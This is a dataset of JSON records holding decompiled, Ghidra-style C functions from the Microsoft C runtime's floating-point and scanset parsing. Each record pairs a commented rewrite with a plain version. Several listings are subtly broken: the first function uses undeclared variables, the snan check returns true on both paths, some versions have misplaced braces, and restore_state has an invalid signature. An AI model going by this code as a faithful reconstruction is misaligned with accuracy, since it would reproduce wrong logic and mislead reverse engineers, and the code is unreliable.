{"Function Name": "parse_floating_point<>", "Address": "1001e338", "Source Code": "\\*\nvoid __cdecl parse_floating_point<>(int *param_1)\n{\n    floating_point_parse_result parse_result; \n    double *parsed_value_pointer; \n    int intermediate_results[195]; \n    uint security_cookie; \n    \n    security_cookie = DAT_1004e008 ^ (uint)&stack0xfffffffc;\n    \n    if (parsed_value_pointer == (double *)0x0 || input_param == (int *)0x0) {\n        undefined4 *error_handler = (undefined4 *)FUN_100253b8(); \n        *error_handler = 0x16; \n        FUN_1001de96(); \n    } else {\n        \n        parse_result = FUN_1001e3b3(input_param, (int *)&stack0x00000008, intermediate_results);\n        \n        __crt_strtox::parse_floating_point_write_result<double>(parse_result, (floating_point_string *)intermediate_results, parsed_value_pointer);\n    }\n    \n    if (additional_output_pointer != (undefined *)0x0 && ((condition_check_1 | condition_check_2) == 0)) {\n        *additional_output_pointer = 0; \n    }\n    \n    ___security_check_cookie_4(security_cookie ^ (uint)&stack0xfffffffc);\n    return; \n}\n*\\ \n \nvoid __cdecl parse_floating_point<>(int *param_1)\n{\n    floating_point_parse_result parse_result;\n    double *parsed_value_pointer;\n    int intermediate_results[195];\n    uint security_cookie;\n    security_cookie = DAT_1004e008 ^ (uint)&stack0xfffffffc;\n    if (parsed_value_pointer == (double *)0x0 || input_param == (int *)0x0) {\n        undefined4 *error_handler = (undefined4 *)FUN_100253b8();\n        *error_handler = 0x16;\n        FUN_1001de96();\n    } else {\n        parse_result = FUN_1001e3b3(input_param, (int *)&stack0x00000008, intermediate_results);\n        __crt_strtox::parse_floating_point_write_result<double>(parse_result, (floating_point_string *)intermediate_results, parsed_value_pointer);\n    }\n    if (additional_output_pointer != (undefined *)0x0 && ((condition_check_1 | condition_check_2) == 0)) {\n        *additional_output_pointer = 0;\n    }\n    ___security_check_cookie_4(security_cookie ^ (uint)&stack0xfffffffc);\n    return;\n}"}
{"Function Name": "parse_floating_point_possible_infinity<>", "Address": "1001f1fa", "Source Code": "\\*\nchar __cdecl\nparse_floating_point_possible_infinity<>\n(wchar_t *param_1,\ninput_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_>\n*param_2,undefined4 param_3,undefined4 param_4)\n{\n    char cVar1; \n    wchar_t wVar2; \n    int iVar3; \n    int local_8; \n    iVar3 = 0; \n    local_8 = 0; \n    \n    while ((*param_1 == *(wchar_t *)((int)&DAT_1003ebe8 + local_8) ||\n            (*param_1 == *(wchar_t *)((int)&DAT_1003ebf0 + local_8)))) {\n        \n        wVar2 = __crt_strtox::\n        input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_>\n        ::get(param_2);\n        local_8 = local_8 + 2; \n        *param_1 = wVar2; \n        \n        if (local_8 == 6) {\n            \n            __crt_strtox::\n            input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_>::unget\n            (param_2,wVar2);\n            \n            param_3 = *(undefined4 *)(param_2 + 0x10);\n            param_4 = *(undefined4 *)(param_2 + 0x14);\n            \n            wVar2 = __crt_strtox::\n            input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_>\n            ::get(param_2);\n            *param_1 = wVar2; \n            \n            while ((*param_1 == *(wchar_t *)((int)L\"INITY\" + iVar3) ||\n                    (*param_1 == *(wchar_t *)((int)L\"inity\" + iVar3)))) {\n                \n                wVar2 = __crt_strtox::\n                input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_>\n                ::get(param_2);\n                iVar3 = iVar3 + 2; \n                *param_1 = wVar2; \n                \n                if (iVar3 == 10) {\n                    \n                    __crt_strtox::\n                    input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_>::\n                    unget(param_2,wVar2);\n                    return '\\x03'; \n                }\n            }\n            \n            cVar1 = FID_conflict_operator__(&param_2);\n            \n            return (cVar1 == '\\0') * '\\x04' + '\\x03'; \n        }\n    }\n    \n    FID_conflict_operator__(&param_2);\n    return '\\a'; \n}\n*\\ \n \nchar __cdecl\nparse_floating_point_possible_infinity<>\n(wchar_t *param_1,\ninput_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_>\n*param_2,undefined4 param_3,undefined4 param_4)\n{\nchar cVar1;\nwchar_t wVar2;\nint iVar3;\nint local_8;\niVar3 = 0;\nlocal_8 = 0;\nwhile ((*param_1 == *(wchar_t *)((int)&DAT_1003ebe8 + local_8) ||\n(*param_1 == *(wchar_t *)((int)&DAT_1003ebf0 + local_8)))) {\n    wVar2 = __crt_strtox::\n    input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_>\n    ::get(param_2);\n    local_8 = local_8 + 2;\n    *param_1 = wVar2;\n    if (local_8 == 6) {\n        __crt_strtox::\n        input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_>::unget\n        (param_2,wVar2);\n        param_3 = *(undefined4 *)(param_2 + 0x10);\n        param_4 = *(undefined4 *)(param_2 + 0x14);\n        wVar2 = __crt_strtox::\n        input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_>\n        ::get(param_2);\n        *param_1 = wVar2;\n        while ((*param_1 == *(wchar_t *)((int)L\"INITY\" + iVar3) ||\n        (*param_1 == *(wchar_t *)((int)L\"inity\" + iVar3)))) {\n            wVar2 = __crt_strtox::\n            input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_>\n            ::get(param_2);\n            iVar3 = iVar3 + 2;\n            *param_1 = wVar2;\n            if (iVar3 == 10) {\n                __crt_strtox::\n                input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_>::\n                unget(param_2,wVar2);\n                return '\\x03';\n            }\n        }\n        cVar1 = FID_conflict_operator__(&param_2);\n        return (cVar1 == '\\0') * '\\x04' + '\\x03';\n    }\n}\nFID_conflict_operator__(&param_2);\nreturn '\\a';\n}"}
{"Function Name": "parse_floating_point_possible_nan<>", "Address": "1001f2c9", "Source Code": "\\*\nint __cdecl\nparse_floating_point_possible_nan<>\n(wchar_t *param_1,\ninput_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_>\n*param_2,undefined4 param_3,undefined4 param_4)\n{\n    wchar_t wVar2; \n    undefined4 uVar3; \n    uint uVar4; \n    int iVar5; \n    iVar5 = 0; \n    do {\n        \n        if ((*param_1 != *(wchar_t *)((int)&DAT_1003ec10 + iVar5)) &&\n            (*param_1 != *(wchar_t *)((int)&DAT_1003ec18 + iVar5))) {\n            FID_conflict_operator__(&param_2); \n            return 7; \n        }\n        \n        \n        wVar2 = __crt_strtox::\n        input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_>\n        ::get(param_2);\n        \n        iVar5 = iVar5 + 2; \n        *param_1 = wVar2; \n    } while (iVar5 != 6); \n    \n    __crt_strtox::\n    input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_>::unget\n    (param_2,wVar2);\n    \n    \n    param_3 = *(undefined4 *)(param_2 + 0x10);\n    param_4 = *(undefined4 *)(param_2 + 0x14);\n    \n    \n    wVar2 = __crt_strtox::\n    input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_>::\n    get(param_2);\n    \n    *param_1 = wVar2; \n    \n    \n    if (wVar2 == L'(') {\n        \n        wVar2 = __crt_strtox::\n        input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_>\n        ::get(param_2);\n        \n        *param_1 = wVar2; \n        \n        \n        uVar3 = parse_floating_point_possible_nan_is_snan<>(param_1,param_2);\n        \n        \n        if ((char)uVar3 == '\\0') {\n            \n            uVar3 = parse_floating_point_possible_nan_is_ind<>(param_1,param_2);\n            \n            \n            if ((char)uVar3 == '\\0') {\n                \n                if (*param_1 == L')') {\n                    return 4; \n                }\n                do {\n                    \n                    uVar4 = (uint)(ushort)*param_1;\n                    if (*param_1 == L'\\0') break; \n                    \n                    \n                    if ((((9 < uVar4 - 0x30) && (0x19 < uVar4 - 0x61)) && (0x19 < uVar4 - 0x41)) &&\n                        (uVar4 != 0x5f)) goto LAB_1001f33a;\n                    \n                    \n                    wVar2 = __crt_strtox::\n                    input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_>\n                    ::get(param_2);\n                    \n                    *param_1 = wVar2; \n                } while (wVar2 != L')'); \n                \n                \n                if (*param_1 == L')') {\n                    return 4; \n                }\n                goto LAB_1001f33a; \n            }\n        }\n    } else {\n        return 5; \n    }\n    \n    \n    __crt_strtox::\n    input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_>::unget\n    (param_2,*param_1);\n    \n    \n    LAB_1001f33a:\n    return 7; \n}\n*\\ \n \nint __cdecl\nparse_floating_point_possible_nan<>\n(wchar_t *param_1,\ninput_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_>\n*param_2,undefined4 param_3,undefined4 param_4)\n{\nwchar_t wVar2;\nundefined4 uVar3;\nuint uVar4;\nint iVar5;\niVar5 = 0;\ndo {\nif ((*param_1 != *(wchar_t *)((int)&DAT_1003ec10 + iVar5)) &&\n(*param_1 != *(wchar_t *)((int)&DAT_1003ec18 + iVar5))) {\nFID_conflict_operator__(&param_2);\nreturn 7;\n}\nwVar2 = __crt_strtox::\ninput_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_>\n::get(param_2);\niVar5 = iVar5 + 2;\n*param_1 = wVar2;\n} while (iVar5 != 6);\n__crt_strtox::\ninput_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_>::unget\n(param_2,wVar2);\nparam_3 = *(undefined4 *)(param_2 + 0x10);\nparam_4 = *(undefined4 *)(param_2 + 0x14);\nwVar2 = __crt_strtox::\ninput_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_>::\nget(param_2);\n*param_1 = wVar2;\nif (wVar2 == L'(') {\nwVar2 = __crt_strtox::\ninput_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_>\n::get(param_2);\n*param_1 = wVar2;\nuVar3 = parse_floating_point_possible_nan_is_snan<>(param_1,param_2);\nif ((char)uVar3 == '\\0') {\nuVar3 = parse_floating_point_possible_nan_is_ind<>(param_1,param_2);\nif ((char)uVar3 == '\\0') {\nif (*param_1 == L')') {\nreturn 4;\n}\ndo {\nuVar4 = (uint)(ushort)*param_1;\nif (*param_1 == L'\\0') break;\nif ((((9 < uVar4 - 0x30) && (0x19 < uVar4 - 0x61)) && (0x19 < uVar4 - 0x41)) &&\n(uVar4 != 0x5f)) goto LAB_1001f33a;\nwVar2 = __crt_strtox::\ninput_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_>\n::get(param_2);\n*param_1 = wVar2;\n} while (wVar2 != L')');\nif (*param_1 == L')') {\nreturn 4;\n}\ngoto LAB_1001f33a;\n}\n}\nelse {\nreturn 5;\n}\n__crt_strtox::\ninput_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_>::unget\n(param_2,*param_1);\n}\nelse {\nLAB_1001f33a:\nreturn 7;\n}\n}"}
{"Function Name": "parse_floating_point_possible_nan_is_ind<>", "Address": "1001f3f5", "Source Code": "\\*\nundefined4 __cdecl\nparse_floating_point_possible_nan_is_ind<>\n(wchar_t *param_1, \ninput_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_> \n*param_2) \n{\n    wchar_t wVar1; \n    uint uVar2 = 0; \n    int iVar4 = 0; \n    do {\n        wVar1 = *param_1; \n        \n        if ((wVar1 != *(wchar_t *)((int)&DAT_1003ec38 + iVar4)) &&\n            (wVar1 != *(wchar_t *)((int)&DAT_1003ec40 + iVar4))) goto LAB_1001f42e; \n        \n        wVar1 = __crt_strtox::\n        input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_>\n        ::get(param_2);\n        uVar2 = (uint)(ushort)wVar1; \n        iVar4 += 2; \n        *param_1 = wVar1; \n    } while (iVar4 != 8); \n    \n    return CONCAT31((int3)(uVar2 >> 8), 1); \nLAB_1001f42e:\n    return CONCAT31((int3)(uVar2 >> 8), 0); \n}\n*\\ \n \nundefined4 __cdecl\nparse_floating_point_possible_nan_is_ind<>\n(wchar_t *param_1,\ninput_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_>\n*param_2)\n{\n    wchar_t wVar1;\n    uint uVar2 = 0;\n    int iVar4 = 0;\n    do {\n        wVar1 = *param_1;\n        if ((wVar1 != *(wchar_t *)((int)&DAT_1003ec38 + iVar4)) &&\n            (wVar1 != *(wchar_t *)((int)&DAT_1003ec40 + iVar4))) goto LAB_1001f42e;\n        wVar1 = __crt_strtox::\n        input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_>\n        ::get(param_2);\n        uVar2 = (uint)(ushort)wVar1;\n        iVar4 += 2;\n        *param_1 = wVar1;\n    } while (iVar4 != 8);\n    \n    return CONCAT31((int3)(uVar2 >> 8), 1);\nLAB_1001f42e:\n    return CONCAT31((int3)(uVar2 >> 8), 0);\n}"}
{"Function Name": "parse_floating_point_possible_nan_is_snan<>", "Address": "1001f435", "Source Code": "\\*\nundefined4 __cdecl\nparse_floating_point_possible_nan_is_snan<>\n(wchar_t *param_1, \ninput_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_>\n*param_2) \n{\n    wchar_t wVar1; \n    uint uVar2 = 0; \n    int iVar4 = 0; \n    do {\n        wVar1 = *param_1; \n        \n        if ((wVar1 != *(wchar_t *)((int)&DAT_1003ec20 + iVar4)) &&\n            (wVar1 != *(wchar_t *)((int)L\"snan)\" + iVar4))) goto LAB_1001f46e; \n        \n        wVar1 = __crt_strtox::\n        input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_>\n        ::get(param_2);\n        \n        uVar2 = (uint)(ushort)wVar1; \n        iVar4 += 2; \n        *param_1 = wVar1; \n    } while (iVar4 != 10); \n    \nLAB_1001f46e: \n    return CONCAT31((int3)(uVar2 >> 8), 1); \n}\n*\\ \n \nundefined4 __cdecl\nparse_floating_point_possible_nan_is_snan<>\n(wchar_t *param_1,\ninput_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_>\n*param_2)\n{\n    wchar_t wVar1;\n    uint uVar2 = 0;\n    int iVar4 = 0;\n    do {\n        wVar1 = *param_1;\n        if ((wVar1 != *(wchar_t *)((int)&DAT_1003ec20 + iVar4)) &&\n            (wVar1 != *(wchar_t *)((int)L\"snan)\" + iVar4))) goto LAB_1001f46e;\n        wVar1 = __crt_strtox::\n        input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_>\n        ::get(param_2);\n        uVar2 = (uint)(ushort)wVar1;\n        iVar4 += 2;\n        *param_1 = wVar1;\n    } while (iVar4 != 10);\n    \nLAB_1001f46e:\n    return CONCAT31((int3)(uVar2 >> 8), 1);\n}"}
{"Function Name": "input_adapter_character_source<>", "Address": "10020112", "Source Code": "\\*\nundefined4 * __thiscall\ninput_adapter_character_source<>\n(void *this, undefined4 param_1, undefined4 param_2, undefined4 param_3, undefined *param_4)\n{\n    \n    *(undefined4 *)this = param_1;\n    \n    *(undefined4 *)((int)this + 8) = param_2;\n    \n    *(undefined4 *)((int)this + 0xc) = param_3;\n    \n    *(undefined **)((int)this + 0x18) = param_4;\n    \n    if (param_4 != (undefined *)0x0) {\n        \n        *param_4 = 1;\n    }\n    \n    return (undefined4 *)this;\n}\n*\\ \n \nundefined4 * __thiscall\ninput_adapter_character_source<>\n(void *this, undefined4 param_1, undefined4 param_2, undefined4 param_3, undefined *param_4)\n{\n    *(undefined4 *)this = param_1;\n    *(undefined4 *)((int)this + 8) = param_2;\n    *(undefined4 *)((int)this + 0xc) = param_3;\n    *(undefined **)((int)this + 0x18) = param_4;\n    if (param_4 != (undefined *)0x0) {\n        *param_4 = 1;\n    }\n    return (undefined4 *)this;\n}"}
{"Function Name": "FID_conflict:operator()", "Address": "1002018b", "Source Code": "\\*\nvoid __fastcall\nFID_conflict_operator__\n(input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_>\n**param_1)\n{\n    \n    __crt_strtox::input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_>::unget(*param_1, *(wchar_t *)param_1[1]);\n    \n    \n    *(undefined2 *)param_1[1] = 0;\n    \n    \n    restore_state(*param_1, *(int *)param_1[2], *(int *)((int)param_1[2] + 4));\n}\n*\\ \n \nvoid __fastcall\nFID_conflict_operator__\n(input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_>\n**param_1)\n{\n    __crt_strtox::input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_>::unget(*param_1, *(wchar_t *)param_1[1]);\n    *(undefined2 *)param_1[1] = 0;\n    restore_state(*param_1, *(int *)param_1[2], *(int *)((int)param_1[2] + 4));\n}"}
{"Function Name": "FUN_1002033d", "Address": "1002033d", "Source Code": "SLD_STATUS __cdecl\nFUN_1002033d(uint param_1,uint param_2,int param_3,bool param_4,char param_5,\nfloating_point_value *param_6)\n{\nfloating_point_value fVar1;\nuint uVar2;\nint iVar3;\nint iVar4;\ndouble *pdVar5;\nfloat *pfVar6;\nbyte bVar7;\nint iVar8;\nuint uVar9;\nbool bVar10;\nbool bVar11;\nlonglong lVar12;\nlonglong lVar13;\nulonglong uVar14;\nulonglong uVar15;\n__uint64 _Var16;\nSLD_STATUS SVar17;\nuint uStack_28;\nuint uStack_24;\nuint uStack_20;\nuint uStack_1c;\nint iStack_c;\nuVar9 = 0;\nuVar14 = CONCAT44(param_2,param_1);\nif (param_2 == 0) {\niVar8 = 0x1f;\nif (param_1 != 0) {\nfor (; param_1 >> iVar8 == 0; iVar8 = iVar8 + -1) {\n}\n}\nif (param_1 == 0) {\niVar8 = 0;\n}\nelse {\niVar8 = iVar8 + 1;\n}\n}\nelse {\niVar8 = 0x1f;\nif (param_2 != 0) {\nfor (; param_2 >> iVar8 == 0; iVar8 = iVar8 + -1) {\n}\n}\niVar8 = iVar8 + 1;\nif (param_2 == 0) {\niVar8 = 0;\n}\niVar8 = iVar8 + 0x20;\n}\nfVar1 = param_6[4];\niVar8 = (((fVar1 == (floating_point_value)0x0) - 1 & 0x1d) + 0x18) - iVar8;\niStack_c = param_3 - iVar8;\nuVar2 = (fVar1 == (floating_point_value)0x0) - 1 & 0x380;\niVar3 = uVar2 + 0x7f;\nif (iVar3 < iStack_c) {\nLAB_100203b9:\n__crt_strtox::assemble_floating_point_infinity(param_4,param_6);\nSVar17 = 3;\n}\nelse {\nif (iStack_c < (int)(((fVar1 == (floating_point_value)0x0) - 1 & 0xfffffc80) - 0x7e)) {\niVar4 = uVar2 + 0x7e + iStack_c + iVar8;\niStack_c = -iVar3;\nif (iVar4 < 0) {\nif (0x3f < (uint)-iVar4) {\nLAB_100204fb:\n__crt_strtox::assemble_floating_point_zero(param_4,param_6);\nreturn 2;\n}\nbVar7 = (byte)-iVar4;\nlVar12 = __allshl(bVar7 - 1,0);\nlVar13 = __allshl(bVar7,0);\nbVar10 = ((uint)lVar12 & param_1 | (uint)((ulonglong)lVar12 >> 0x20) & param_2) != 0;\nbVar11 = false;\nif ((param_5 == '\\0') ||\n(((uint)(lVar12 + -1) & param_1 | (uint)((ulonglong)(lVar12 + -1) >> 0x20) & param_2) !=\n0)) {\nbVar11 = true;\n}\nif ((bVar10) || (bVar11)) {\nuVar2 = FUN_1002bdeb();\nif (uVar2 == 0) {\nif ((bVar10) &&\n((bVar11 ||\n(((uint)lVar13 & param_1 | (uint)((ulonglong)lVar13 >> 0x20) & param_2) != 0)))) {\nuVar9 = 1;\n}\n}\nelse if (uVar2 == 0x100) {\nuVar9 = (uint)param_4;\n}\nelse if (uVar2 == 0x200) {\nuVar9 = (uint)!param_4;\n}\n}\nuVar14 = __aullshr(bVar7,param_2);\nuVar14 = uVar14 + uVar9;\nif (uVar14 == 0) goto LAB_100204fb;\nuVar15 = FUN_100226f0((int)param_6);\nif (uVar15 < uVar14) {\niStack_c = ((param_3 - iVar4) - iVar8) + -1;\n}\n}\nelse {\nbVar7 = (byte)iVar4;\nLAB_10020630:\nuVar14 = __allshl(bVar7,param_2);\n}\n}\nelse if (iVar8 < 0) {\nif ((uint)-iVar8 < 0x40) {\nbVar7 = (byte)-iVar8;\nlVar12 = __allshl(bVar7 - 1,0);\nlVar13 = __allshl(bVar7,0);\nuStack_28 = (uint)lVar12;\nuStack_24 = (uint)((ulonglong)lVar12 >> 0x20);\nbVar11 = (uStack_28 & param_1 | uStack_24 & param_2) != 0;\nif (param_5 == '\\0') {\nLAB_10020597:\nbVar10 = true;\n}\nelse {\nuStack_20 = (uint)(lVar12 + -1);\nuStack_1c = (uint)((ulonglong)(lVar12 + -1) >> 0x20);\nbVar10 = false;\nif ((uStack_20 & param_1 | uStack_1c & param_2) != 0) goto LAB_10020597;\n}\nif ((bVar11) || (bVar10)) {\nuVar2 = FUN_1002bdeb();\nif (uVar2 == 0) {\nif ((bVar11) &&\n((bVar10 ||\n(((uint)lVar13 & param_1 | (uint)((ulonglong)lVar13 >> 0x20) & param_2) != 0)))) {\nuVar9 = 1;\n}\n}\nelse if (uVar2 == 0x100) {\nuVar9 = (uint)param_4;\n}\nelse if (uVar2 == 0x200) {\nuVar9 = (uint)!param_4;\n}\n}\nuVar14 = __aullshr(bVar7,param_2);\nuVar14 = uVar14 + uVar9;\n}\nelse {\nuVar14 = 0;\n}\n_Var16 = __crt_strtox::floating_point_value::normal_mantissa_mask(param_6);\nif (_Var16 < uVar14) {\nuVar14 = uVar14 >> 1;\niStack_c = iStack_c + 1;\nif ((int)(((param_6[4] == (floating_point_value)0x0) - 1 & 0x380) + 0x7f) < iStack_c)\ngoto LAB_100203b9;\n}\n}\nelse if (0 < iVar8) {\nbVar7 = (byte)iVar8;\ngoto LAB_10020630;\n}\nuVar15 = FUN_100226f0((int)param_6);\nif (param_6[4] == (floating_point_value)0x0) {\npfVar6 = __crt_strtox::floating_point_value::as_float(param_6);\nSVar17 = __crt_strtox::assemble_floating_point_value_t<float>\n(param_4,iStack_c,uVar14 & uVar15,pfVar6);\n}\nelse {\npdVar5 = __crt_strtox::floating_point_value::as_double(param_6);\nSVar17 = __crt_strtox::assemble_floating_point_value_t<double>\n(param_4,iStack_c,uVar14 & uVar15,pdVar5);\n}\n}\nreturn SVar17;\n}"}
{"Function Name": "restore_state", "Address": "10022faa", "Source Code": "uint restoreState restore_state(void *objectState, int inputParam1, int inputParam2)\n{\n    uint returnValue; \n    \n    if (inputParam1 == *(int *)((int)objectState + 0x10) && inputParam2 == *(int *)((int)objectState + 0x14)) {\n        \n        returnValue = CONCAT31((int3)((uint)inputParam2 >> 8), 1);\n    } else {\n        \n        *(undefined **)((int)objectState + 0x18) = 0;\n        returnValue = 0; \n    }\n    return returnValue; \n}"}
{"Function Name": "FUN_100234b6", "Address": "100234b6", "Source Code": "\\*\nuint __fastcall FUN_100234b6(format_string_parser<wchar_t> *formatParser)\n{\n    \n    scanset_storage<2> *scansetStorage = (scanset_storage<2> *)(formatParser + 0x34);\n    \n    \n    uchar *dataPointer = __crt_stdio_input::scanset_storage<2>::data(scansetStorage);\n    uint resultCode;\n    \n    if (dataPointer == (uchar *)0x0) {\n        \n        __crt_stdio_input::format_string_parser<wchar_t>::reset_token_state_for_error(formatParser, 0xc);\n        \n        resultCode = (uint)dataPointer & 0xffffff00;\n    } else {\n        \n        __crt_stdio_input::scanset_buffer<wchar_t>::reset((scanset_buffer<wchar_t> *)scansetStorage);\n        \n        \n        bool isCaretFound = **(short **)(formatParser + 8) == 0x5e;\n        if (isCaretFound) {\n            \n            *(short **)(formatParser + 8) = *(short **)(formatParser + 8) + 1;\n        }\n        \n        \n        if (**(short **)(formatParser + 8) == 0x5d) {\n            \n            *(short **)(formatParser + 8) = *(short **)(formatParser + 8) + 1;\n            \n            __crt_stdio_input::scanset_buffer<wchar_t>::set((scanset_buffer<wchar_t> *)scansetStorage, L']');\n        }\n        \n        \n        wchar_t *currentCharPointer = *(wchar_t **)(formatParser + 8);\n        wchar_t currentChar = *currentCharPointer;\n        \n        while (currentChar != L']') {\n            if (*currentCharPointer == L'\\0') break; \n            \n            \n            if (((*currentCharPointer == L'-') && (currentCharPointer != *(wchar_t **)(formatParser + 8))) && (currentCharPointer[1] != L']')) {\n                wchar_t rangeStart = currentCharPointer[-1]; \n                wchar_t rangeEnd = currentCharPointer[1];   \n                \n                \n                if ((ushort)rangeEnd < (ushort)rangeStart) {\n                    wchar_t temp = rangeStart; \n                    rangeStart = rangeEnd;\n                    rangeEnd = temp;\n                }\n                \n                \n                for (; rangeStart != (wchar_t)(rangeEnd + L'\\x01'); rangeStart = rangeStart + L'\\x01') {\n                    __crt_stdio_input::scanset_buffer<wchar_t>::set((scanset_buffer<wchar_t> *)scansetStorage, rangeStart);\n                }\n            } else {\n                \n                __crt_stdio_input::scanset_buffer<wchar_t>::set((scanset_buffer<wchar_t> *)scansetStorage, *currentCharPointer);\n            }\n            \n            \n            *(int *)(formatParser + 8) = *(int *)(formatParser + 8) + 2;\n            currentChar = **(wchar_t **)(formatParser + 8); \n        }\n        \n        short *endCharPointer = *(short **)(formatParser + 8);\n        \n        \n        if (*endCharPointer == 0) {\n            \n            __crt_stdio_input::format_string_parser<wchar_t>::reset_token_state_for_error(formatParser, 0x16);\n            \n            resultCode = (uint)endCharPointer & 0xffffff00;\n        } else {\n            \n            if (isCaretFound) {\n                __crt_stdio_input::scanset_buffer<wchar_t>::invert((scanset_buffer<wchar_t> *)scansetStorage);\n            }\n            \n            *(int *)(formatParser + 8) = *(int *)(formatParser + 8) + 2;\n            \n            resultCode = CONCAT31((int3)((uint)endCharPointer >> 8), 1);\n        }\n    }\n    \n    return resultCode;\n}\n*\\ \n \nuint __fastcall FUN_100234b6(format_string_parser<wchar_t> *formatParser)\n{\n    scanset_storage<2> *scansetStorage = (scanset_storage<2> *)(formatParser + 0x34);\n    uchar *dataPointer = __crt_stdio_input::scanset_storage<2>::data(scansetStorage);\n    uint resultCode;\n    if (dataPointer == (uchar *)0x0) {\n        __crt_stdio_input::format_string_parser<wchar_t>::reset_token_state_for_error(formatParser, 0xc);\n        resultCode = (uint)dataPointer & 0xffffff00;\n    } else {\n        __crt_stdio_input::scanset_buffer<wchar_t>::reset((scanset_buffer<wchar_t> *)scansetStorage);\n        bool isCaretFound = **(short **)(formatParser + 8) == 0x5e;\n        if (isCaretFound) {\n            *(short **)(formatParser + 8) = *(short **)(formatParser + 8) + 1;\n        }\n        if (**(short **)(formatParser + 8) == 0x5d) {\n            *(short **)(formatParser + 8) = *(short **)(formatParser + 8) + 1;\n            __crt_stdio_input::scanset_buffer<wchar_t>::set((scanset_buffer<wchar_t> *)scansetStorage, L']');\n        }\n        wchar_t *currentCharPointer = *(wchar_t **)(formatParser + 8);\n        wchar_t currentChar = *currentCharPointer;\n        while (currentChar != L']') {\n            if (*currentCharPointer == L'\\0') break;\n            if (((*currentCharPointer == L'-') && (currentCharPointer != *(wchar_t **)(formatParser + 8))) && (currentCharPointer[1] != L']')) {\n                wchar_t rangeStart = currentCharPointer[-1];\n                wchar_t rangeEnd = currentCharPointer[1];\n                if ((ushort)rangeEnd < (ushort)rangeStart) {\n                    wchar_t temp = rangeStart;\n                    rangeStart = rangeEnd;\n                    rangeEnd = temp;\n                }\n                for (; rangeStart != (wchar_t)(rangeEnd + L'\\x01'); rangeStart = rangeStart + L'\\x01') {\n                    __crt_stdio_input::scanset_buffer<wchar_t>::set((scanset_buffer<wchar_t> *)scansetStorage, rangeStart);\n                }\n            } else {\n                __crt_stdio_input::scanset_buffer<wchar_t>::set((scanset_buffer<wchar_t> *)scansetStorage, *currentCharPointer);\n            }\n            *(int *)(formatParser + 8) = *(int *)(formatParser + 8) + 2;\n            currentChar = **(wchar_t **)(formatParser + 8);\n        }\n        short *endCharPointer = *(short **)(formatParser + 8);\n        if (*endCharPointer == 0) {\n            __crt_stdio_input::format_string_parser<wchar_t>::reset_token_state_for_error(formatParser, 0x16);\n            resultCode = (uint)endCharPointer & 0xffffff00;\n        } else {\n            if (isCaretFound) {\n                __crt_stdio_input::scanset_buffer<wchar_t>::invert((scanset_buffer<wchar_t> *)scansetStorage);\n            }\n            *(int *)(formatParser + 8) = *(int *)(formatParser + 8) + 2;\n            resultCode = CONCAT31((int3)((uint)endCharPointer >> 8), 1);\n        }\n    }\n    return resultCode;\n}"}
{"Function Name": "write_character", "Address": "100237c8", "Source Code": "undefined4\nwrite_character(undefined *destination_buffer, int special_case_flag, char **destination_string, rsize_t *remaining_size, wchar_t wide_character)\n{\n    rsize_t bytes_written; \n    errno_t error_code;  \n    \n    if (special_case_flag == -1) {\n        \n        if (_wctomb_s((int *)&bytes_written, *destination_string, 5, wide_character) == 0) {\n            \n            *destination_string += (int)bytes_written;\n            \n            *remaining_size -= (int)bytes_written;\n        } else {\n            \n            __invoke_watson((wchar_t *)0x0, (wchar_t *)0x0, (wchar_t *)0x0, 0, 0);\n        }\n    } else {\n        \n        error_code = _wctomb_s((int *)&bytes_written, *destination_string, *remaining_size, wide_character);\n        \n        if (error_code == 0x22) {\n            *destination_buffer = 0; \n            return (uint)destination_buffer & 0xffffff00; \n        }\n        \n        if (0 < (int)bytes_written) {\n            \n            *destination_string += (int)bytes_written;\n            \n            *remaining_size -= (int)bytes_written;\n        }\n    }\n    \n    return CONCAT31((int3)((uint)bytes_written >> 8), 1);\n}"}
